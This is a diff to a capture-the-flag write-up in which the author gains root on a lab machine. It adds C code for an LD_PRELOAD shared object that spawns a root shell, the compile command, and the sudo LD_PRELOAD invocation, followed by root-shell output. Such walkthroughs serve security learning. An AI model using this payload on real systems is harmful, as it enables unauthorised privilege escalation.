@@ -320,4 +320,73 @@ Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
 webdeveloper@sky:~$ cd /tmp
 webdeveloper@sky:/tmp$ nano shell.c
 ```
-YES! We can.
+YES! We can
+Ok, time to add the C code according to this website.
+
+```console
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+}
+```
+
+Now, time to run the rest.
+```console
+The authenticity of host '10.10.1.88 (10.10.1.88)' can't be established.
+ECDSA key fingerprint is SHA256:zSoCEcBBY73hNL9ItPA4CnB/405/W6GQYsl94qRMkOo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.1.88' (ECDSA) to the list of known hosts.
+webdeveloper@10.10.1.88's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 12 Dec 2021 07:58:33 PM UTC
+
+  System load:  0.05              Processes:             123
+  Usage of /:   60.0% of 9.78GB   Users logged in:       0
+  Memory usage: 65%               IPv4 address for eth0: 10.10.1.88
+  Swap usage:   0%
+
+
+185 updates can be installed immediately.
+100 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
+webdeveloper@sky:~$ cd /tmp
+webdeveloper@sky:/tmp$ nano shell.c
+webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+shell.c: In function ‘_init’:
+shell.c:8:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    8 |  setgid(0);
+      |  ^~~~~~
+shell.c:9:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    9 |  setuid(0);
+      |  ^~~~~~
+$ sudo LD_PRELOAD=/tmp/shell.so sky_backup_utility
+root@sky:/tmp# whoami
+root
+root@sky:/tmp# cd ..
+root@sky:/# ls
+bin    dev   lib    libx32      mnt   root  snap      sys  var
+boot   etc   lib32  lost+found  opt   run   srv       tmp
+cdrom  home  lib64  media       proc  sbin  swap.img  usr
+root@sky:/# cd root
+root@sky:~# ls
+root.txt
+root@sky:~# cat root.txt
+********************************
+```
+Holy cow, we are root and got the root flag!!!!!
